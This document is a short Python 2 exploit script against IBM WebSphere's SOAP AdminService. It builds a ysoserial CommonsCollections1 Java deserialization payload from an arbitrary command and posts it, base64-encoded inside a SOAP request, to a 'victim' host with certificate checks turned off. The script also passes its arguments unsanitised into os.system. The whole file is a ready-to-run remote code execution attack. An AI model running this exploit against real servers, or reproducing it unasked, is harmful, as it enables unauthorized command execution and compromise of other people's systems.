#!/usr/bin/python

import sys
import os
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


#check for args, print usage if incorrect
if len(sys.argv) != 6:
    print '\nUsage:\nwebsphere.py [protocol] [victim ip] [victim port] [path to ysoserial] \'[command to execute]\'\n'
    sys.exit()

#generates ysoserial payload
os.system('java -jar ' + sys.argv[4] + ' CommonsCollections1 ' + '\'' + sys.argv[5] + '\' | base64 -w 0 > payload.out')


#build payload
payloadObj = open('payload.out','rb').read()
headers = {'Content-Type': 'text/xml; charset=utf-8',
           'SOAPAction': 'urn:AdminService'}
xml = (
'<?xml version=\'1.0\' encoding=\'UTF-8\'?>'
'<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">'
'<SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">'
'<LoginMethod>BasicAuth</LoginMethod>'
'</SOAP-ENV:Header>'
'<SOAP-ENV:Body>'
'<ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
'<objectname xsi:type="ns1:javax.management.ObjectName">{payload}</objectname>'
'<attribute xsi:type="xsd:string">ringBufferSize</attribute>'
'</ns1:getAttribute>'
'</SOAP-ENV:Body>'
'</SOAP-ENV:Envelope>'
).format(payload=payloadObj)

r = requests.post('{}://{}:{}'.format(sys.argv[1], sys.argv[2], int(sys.argv[3])), data=xml, headers=headers, verify=False)
print '[*] HTTPS request sent successfully'


